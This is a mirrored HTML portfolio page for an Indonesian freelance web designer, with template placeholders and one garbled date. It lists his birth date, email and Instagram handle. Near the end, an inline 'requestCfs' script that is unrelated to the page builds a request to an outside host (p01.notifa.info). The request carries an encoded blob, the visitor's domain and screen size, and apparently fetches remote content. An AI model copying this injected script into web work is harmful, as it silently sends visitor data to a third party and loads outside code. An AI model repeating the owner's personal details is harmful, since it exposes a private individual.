...
<!-- Mirrored from slimhamdi.net/moscow/demos/index-dark.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 09 Sep 2019 17:05:20 GMT -->

<head>
    <meta charset="utf-8" />
    <title>Dan - Personal Portfolio</title>
...
<body class="dark">
    ...
    <!-- Wrapper Starts -->
    <div class="wrapper">
        <div class="main-picture men hide-on-med-and-down">
        </div>
                        ...
                        <div class="title-heading">
                            <div class="selector uppercase" id="selector">
                                <h3 class="ah-headline p-none m-none">
                                    ...
                                    <span class="my-name">Ramadhan Arief</span>
                                    <span class="ah-words-wrapper">
                                        <b class="is-visible">Bachelor of Informatics</b>
                    ...
                    <div class="container infos">
                        ...
                        <div class="row">
                            ...
                            <div class="col s12 m4 profile-picture show-on-medium-and-down section-padding">
                                <img src="images/men.jpg" class="responsive-img my-picture" alt="My Photo">
                            </div>
                            <!-- Picture Ends -->
                            <div class="col s12 m8 l12 xl12 personal-info section-padding">
                                ...
                                <div class="col m12 l12 xl9 p-none">
                                    <p class="second-font">I'm a Freelance Web Designer & Developer based in Gresik, Indonesia.
                                    </p>
                                </div>
                                <div class="col s12 m12 l6 p-none">
                                    <ul class="second-font list-1">
                                        <li><span class="font-weight-700">Name: </span>Ramadhan Syaifuddin Arief</li>
                                        <li><span class="font-weight-700">Date of birth: </span>18 January 1997 </li>
                                        <li><span class="font-weight-700">Nationality: </span>Indonesian</li>
                                        <li><span class="font-weight-700">Freelance: </span>Available</li>
                                    </ul>
                                </div>
                                <div class="col s12 m12 l6 p-none">
                                    <ul class="second-font list-2">
                                        <li><span class="font-weight-700">Address: </span>Gresik, Indonesia</li>
                                        <li><span class="font-weight-700">Email: </span>ramadhanrsa18@gmail.com</li>
                                        <li><span class="font-weight-700">Spoken Langages: </span>Indonesia - English</li>
                                        <li><span class="font-weight-700">Instagram: </span>ramadhandadaan</li>
                                    </ul>
                                </div>
                            ...
                            <div class="valign-wrapper row">
                                ...
                                <div class="resume-list col l4 section-padding">
                                    ...
                                    <div class="resume-list-item" data-index="2" id="resume-list-item-2">
                                        <div class="resume-list-item-inner">
                                            <h6 class="resume-list-item-title uppercase"><i class="fa fa-certificate"></i> Certifications</h6>
                                        </div>
                                    </div>
                                    <div class="resume-list-item" data-index="3" id="resume-list-item-3">
                                        <div class="resume-list-item-inner">
                                            <h6 class="resume-list-item-title uppercase"><i class="fa fa-star"></i> Skills</h6>
                                        </div>
                                    </div>
                                    <div class="resume-list-item" data-index="4" id="resume-list-item-4">
                                        <div class="resume-list-item-inner">
                                            <h6 class="resume-list-item-title uppercase"><i class="fa fa-star"></i> Coba</h6>
                                        </div>
                                    </div>
                                </div>
                                <!-- Resume Menu Ends -->
                                ...
                                <div class="col s12 m12 l8 resume-cards-container section-padding">
                                    <div class="resume-cards">
                                            ...
                                            <div class="resume-card-body experience">
                                                <div class="resume-card-body-container second-font">
                                                    ...
                                                    <div class="resume-content">
                                                        <h6 class="uppercase"><span>Web Designer - </span>Konikutak</h6>
                                                        <span class="date"><i class="fa fa-calendar-o"></i> 2019 - Present</span>
                                                        <p>Freelance</p>
                                                    </div>
                                                    ...
                                                    <!-- Single Experience Starts -->
                                                    <div class="resume-content">
                                                        <h6 class="uppercase"><span>Internet of Things - </span>Universitas Internasional Semen Indonesia</h6>
                                                        <span class="date"><i class="fa fa-calendar-o"></i> 2018 - 2019</span>
                                                    ...
                                                    <!-- Single Experience Starts -->
                                                    <div class="resume-content">
                                                        <h6 class="uppercase"><span>Mobile Application Developer - </span>PT Semen Indonesia</h6>
                                                        <span class="date"><i class="fa fa-calendar-o"></i> 2018 </span>
                                                        <p>Internship</p>
                                                    </div>
                                                    <!-- Single Experience Ends -->
                                                </div>
                                        ...
                                        <div class="resume-card resume-card-1" data-index="1">
                                            ...
                                            <div class="resume-card-body education">
                                                <div class="resume-card-body-container second-font">
                                                    ...
                                                    <div class="resume-content">
                                                        <h6 class="uppercase"><span>Bachelor Degree - </span> Universitas Internasional Semen Indonesia </h6>
                                                    ...
                                                    <!-- Single Education Starts -->
                                                    <div class="resume-content">
                                                        <h6 class="uppercase"><span>High School - </span> Semen Gresik</h6>
                                        ...
                                        <div class="resume-card resume-card-2" data-index="2">
                                            <!-- Certificate Header Title Starts -->
                                            <div class="resume-card-header">
                                                <div class="resume-card-name"><i class="fa fa-certificate"></i> Certificate</div>
                                            </div>
                                            <!-- Certificate Header Title Starts -->
                                            <div class="resume-card-body certificate">
                                                <div class="resume-card-body-container second-font">
                                                    <!-- Single Certificate Starts -->
                                                    <div class="resume-content">
                                                        <h6 class="uppercase"><span>Bachelor Degree - </span> Universitas Internasional Semen Indonesia </h6>
                                                        <span class="date"><i class="fa fa-calendar-o"></i> 2015 - 2018</span>
                                                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus pretium orci sit amet mi ullamcorper</p>
                                                    </div>
                                                    <!-- Single Certificate Ends -->
                                                    <span class="separator"></span>
                                                    <!-- Single Certificate Starts -->
                                                    <div class="resume-content">
                                                        <h6 class="uppercase"><span>High School - </span> Semen Gresik</h6>
                                        ...
                                        <!-- Skills Starts -->
                                        <div class="resume-card resume-card-3" data-index="3">
                                        ...
                                        <!-- Skills Ends -->
                                        <!-- Certificate Starts -->
                                        <div class="resume-card resume-card-4" data-index="4">
                                            <!-- Certificate Header Title Starts -->
                                            <div class="resume-card-header">
                                                <div class="resume-card-name"><i class="fa fa-certificate"></i> Coba</div>
                                            </div>
                                            <!-- Certificate Header Title Starts -->
                                            <div class="resume-card-body certificate">
                                                <div class="resume-card-body-container second-font">
                    ...
                    <div class="container">
                        ...
                        <div class="row contact section-padding">
                            ...
                            <div class="col s12 m5 l5 xl4 leftside">
                                ...
                                <span class="font-weight-400 second-font"><i class="fa fa-envelope"></i> ramadhanrsa18@gmail.com</span>
                                <h6 class="font-weight-700 uppercase">Instagram</h6>
                                <span class="font-weight-400 second-font"><i class="fa fa-Instagram"></i> ramadhandadaan</span>
                                <h6 class="font-weight-700 uppercase">Address</h6>
                                <span class="font-weight-400 second-font"><i class="fa fa-home"></i> Gresik, Indonesia</span><br>
                                <!-- Contacts Ends -->
                    ...
                    <div class="row">
                        ...
                        <div class="col s12 l6 xl6 section-padding">
                            ...
                            <ul class="project-details second-font">
                                <li><i class="fa fa-user"></i><span class="font-weight-700"> Destination </span>: <span class="font-weight-400 uppercase">Bali</span></li>
                                <li><i class="fa fa-calendar-o"></i><span class="font-weight-700"> Start Date </span>: <span class="font-weight-400 uppercase">02/11/201about7</span></li>
    ...
    <script type="text/javascript">
        if (self == top) {
            ...
            function requestCfs() {
                ...
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH22x2VCAoFiIGZBb1lBSkXUmimqC2xxtrakaekOgWqZBSzNXkm%2fSg6QhFQll26PWRU17AoAwqsdQnz567xPEPVoP30uLa1p52R0NAjc1LDiNoLD%2bqGn6%2bxCAxqMWrMTvfoT0wTQnv1Q9q0XJUhrpahDNDwHaFORs9JmxHc6eYX03zP1gH%2fR4gHHmefBCwiSeun2m4HsEWdPapdhjYrZCr2UmcmqqabVKjYLlNr49G99ClgvrEJ1aEXKKpjlR5dLELd1BuRMx9%2bwp2sP3mrortPX2OSgdDTia%2bTk6nkxTsdPQDa6x4qeYDjxSScJbw4%2bMM8EoIqypS97qdJRNgX%2bIctqe5Ixe6d2oK0vMU8YbSHG4Fs5eRNrVVQCYl4c%2ftikKPmIkeqZ97tzgwI3kMIi%2fe%2foUhhdioCsycMJmhXrhKA8zoC1tKMRxgaPz5n%2f7yFoyL1llSw8n1S4xFR%2bPWkY8eS2XjaA7RM9zGasRvCXEO23JQ%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
...
<!-- Mirrored from slimhamdi.net/moscow/demos/index-dark.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 09 Sep 2019 17:06:01 GMT -->
